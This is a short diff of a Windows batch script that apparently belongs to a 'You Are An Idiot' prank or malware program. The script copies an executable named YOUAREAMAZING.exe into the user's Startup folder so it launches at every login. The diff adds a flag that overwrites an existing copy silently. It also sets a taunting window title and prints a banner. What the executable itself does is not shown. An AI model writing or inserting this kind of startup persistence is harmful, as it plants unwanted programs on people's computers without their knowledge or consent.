@@ -1,6 +1,6 @@
 @echo off
 color 40
-copy YOUAREAMAZING.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+copy YOUAREAMAZING.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /y
 title ☺☻YOUAREANIDIOT☺☻
 echo ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
 echo ▓                                                                                                      ▓
